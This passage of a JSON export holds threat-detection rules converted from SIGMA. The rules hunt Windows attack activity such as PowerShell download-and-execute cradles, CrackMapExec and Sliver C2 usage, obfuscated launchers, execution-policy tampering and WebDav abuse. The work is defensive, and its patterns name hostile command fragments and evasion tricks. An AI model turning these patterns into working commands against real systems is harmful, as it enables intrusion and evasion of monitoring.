            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"add \" and tgt.process.cmdline contains \"SYSTEM\\CurrentControlSet\\Services\\\" and tgt.process.cmdline contains \" ImagePath \")) and (tgt.process.cmdline contains \" -d \" or tgt.process.cmdline contains \" /d \" or tgt.process.cmdline contains \" \u2013d \" or tgt.process.cmdline contains \" \u2014d \" or tgt.process.cmdline contains \" \u2015d \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 460
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious shell spawn from Java utility keytool process (e.g. adselfservice plus exploitation)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Shells Spawn by Java Utility Keytool",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\keytool.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\query.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 461
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use NTFS Short Name in Command Line",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"~1.exe\" or tgt.process.cmdline contains \"~1.bat\" or tgt.process.cmdline contains \"~1.msi\" or tgt.process.cmdline contains \"~1.vbe\" or tgt.process.cmdline contains \"~1.vbs\" or tgt.process.cmdline contains \"~1.dll\" or tgt.process.cmdline contains \"~1.ps1\" or tgt.process.cmdline contains \"~1.js\" or tgt.process.cmdline contains \"~1.hta\" or tgt.process.cmdline contains \"~2.exe\" or tgt.process.cmdline contains \"~2.bat\" or tgt.process.cmdline contains \"~2.msi\" or tgt.process.cmdline contains \"~2.vbe\" or tgt.process.cmdline contains \"~2.vbs\" or tgt.process.cmdline contains \"~2.dll\" or tgt.process.cmdline contains \"~2.ps1\" or tgt.process.cmdline contains \"~2.js\" or tgt.process.cmdline contains \"~2.hta\") and (not ((src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\") or tgt.process.cmdline contains \"C:\\xampp\\vcredist\\VCREDI~1.EXE\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 462
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated use of Environment Variables to execute PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation VAR+ Launcher",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline matches \"cmd.{0,5}(?:/c|/r)(?:\\\\s|)\\\\\"set\\\\s[a-zA-Z]{3,6}.*(?:\\\\{\\\\d\\\\}){1,}\\\\\\\\\\\\\"\\\\s+?\\\\-f(?:.*\\\\)){1,}.*\\\\\"\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 463
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the PowerShell execution policy registry key in order to bypass signing requirements for script execution from the CommandLine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential PowerShell Execution Policy Tampering - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\ShellIds\\Microsoft.PowerShell\\ExecutionPolicy\" or tgt.process.cmdline contains \"\\Policies\\Microsoft\\Windows\\PowerShell\\ExecutionPolicy\") and (tgt.process.cmdline contains \"Bypass\" or tgt.process.cmdline contains \"RemoteSigned\" or tgt.process.cmdline contains \"Unrestricted\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 464
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1216"
            ],
            "name": "Execute Code with Pester.bat as Parent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and src.process.cmdline contains \"\\WindowsPowerShell\\Modules\\Pester\\\") and (src.process.cmdline contains \"{ Invoke-Pester -EnableExit ;\" or src.process.cmdline contains \"{ Get-Help \\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 465
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process activity patterns as seen being used by Sliver C2 framework implants",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "HackTool - Sliver C2 Implant Activity Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"-NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 466
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1104",
                "t1105"
            ],
            "name": "PowerShell DownloadFile",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"powershell\" and tgt.process.cmdline contains \".DownloadFile\" and tgt.process.cmdline contains \"System.Net.WebClient\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 467
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"BitLockerToGo.EXE\".\nBitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature includes the encryption of, USB flash drives, SD cards, External hard disk drives, Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file system.\nThis is a rarely used application and usage of it at all is worth investigating.\nMalware such as Lumma stealer has been seen using this process as a target for process hollowing.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "BitLockerTogo.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\BitLockerToGo.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 468
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Execution Location Of Wermgr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wermgr.exe\" and (not (tgt.process.image.path contains \"C:\\Windows\\System32\\\" or tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\\" or tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 469
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1216"
            ],
            "name": "SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\SyncAppvPublishingServer.vbs\" and tgt.process.cmdline contains \";\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 470
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1053",
                "t1059",
                "t1059",
                "t1110",
                "t1201"
            ],
            "name": "HackTool - CrackMapExec Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\crackmapexec.exe\" or tgt.process.cmdline contains \" -M pe_inject \" or (tgt.process.cmdline contains \" --local-auth\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -x \") or (tgt.process.cmdline contains \" --local-auth\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" -H 'NTHASH'\") or (tgt.process.cmdline contains \" mssql \" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" -M \" and tgt.process.cmdline contains \" -d \") or (tgt.process.cmdline contains \" smb \" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -H \" and tgt.process.cmdline contains \" -M \" and tgt.process.cmdline contains \" -o \") or (tgt.process.cmdline contains \" smb \" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" --local-auth\")) or ((tgt.process.cmdline contains \" --local-auth\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \") and (tgt.process.cmdline contains \" 10.\" and tgt.process.cmdline contains \" 192.168.\" and tgt.process.cmdline contains \"/24 \")))) | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 471
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious ways to download files or content using PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1105"
            ],
            "name": "PowerShell Web Download",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \".DownloadString(\" or tgt.process.cmdline contains \".DownloadFile(\" or tgt.process.cmdline contains \"Invoke-WebRequest \" or tgt.process.cmdline contains \"iwr \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 472
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "File Download with Headless Browser",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and (tgt.process.cmdline contains \"--headless\" and tgt.process.cmdline contains \"dump-dom\" and tgt.process.cmdline contains \"http\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 473
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially a sign of exploitation of CVE-2023-23397\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048"
            ],
            "name": "Suspicious WebDav Client Execution Via Rundll32.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\svchost.exe\" and src.process.cmdline contains \"-s WebClient\" and tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"C:\\windows\\system32\\davclnt.dll,DavSetCookie\" and tgt.process.cmdline matches \"://\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\") and (not (tgt.process.cmdline contains \"://10.\" or tgt.process.cmdline contains \"://192.168.\" or tgt.process.cmdline contains \"://172.16.\" or tgt.process.cmdline contains \"://172.17.\" or tgt.process.cmdline contains \"://172.18.\" or tgt.process.cmdline contains \"://172.19.\" or tgt.process.cmdline contains \"://172.20.\" or tgt.process.cmdline contains \"://172.21.\" or tgt.process.cmdline contains \"://172.22.\" or tgt.process.cmdline contains \"://172.23.\" or tgt.process.cmdline contains \"://172.24.\" or tgt.process.cmdline contains \"://172.25.\" or tgt.process.cmdline contains \"://172.26.\" or tgt.process.cmdline contains \"://172.27.\" or tgt.process.cmdline contains \"://172.28.\" or tgt.process.cmdline contains \"://172.29.\" or tgt.process.cmdline contains \"://172.30.\" or tgt.process.cmdline contains \"://172.31.\" or tgt.process.cmdline contains \"://127.\" or tgt.process.cmdline contains \"://169.254.\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 474
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell download and execution cradles.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "PowerShell Download and Execution Cradles",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \".DownloadString(\" or tgt.process.cmdline contains \".DownloadFile(\" or tgt.process.cmdline contains \"Invoke-WebRequest \" or tgt.process.cmdline contains \"iwr \") and (tgt.process.cmdline contains \";iex $\" or tgt.process.cmdline contains \"| IEX\" or tgt.process.cmdline contains \"|IEX \" or tgt.process.cmdline contains \"I`E`X\" or tgt.process.cmdline contains \"I`EX\" or tgt.process.cmdline contains \"IE`X\" or tgt.process.cmdline contains \"iex \" or tgt.process.cmdline contains \"IEX (\" or tgt.process.cmdline contains \"IEX(\" or tgt.process.cmdline contains \"Invoke-Expression\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 475
    },
    {
        "fields": {
            "actors": [],
